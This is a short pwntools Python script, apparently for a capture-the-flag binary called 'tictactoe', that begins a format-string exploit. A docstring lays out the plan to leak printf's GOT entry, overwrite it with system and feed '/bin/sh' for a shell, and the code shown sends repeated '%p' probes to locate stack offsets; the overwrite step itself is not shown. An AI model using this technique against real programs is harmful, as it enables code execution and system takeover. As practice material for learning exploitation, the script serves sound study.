from pwn import *

context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'

context.binary = e = ELF('./tictactoe')

sys_addr = e.symbols['system']
printf_got = e.got['printf']
printf_plt = e.plt['printf']
printf_offset = e.symbols['printf'] - e.got['printf']
"""
    format string vulnerability
    1. leak the got address of printf
    2. overwrite the printf-got with system
    3. write as input "/bin/sh"
"""
p = process('./tictactoe')

# write the address of printf to the stack
for i in range(20):
    payload = b'A' * 4 + b'%p' * (i + 5)
    print('num of args:', i+5)
    p.sendlineafter('Your move: ', payload)
    print(p.recvline())
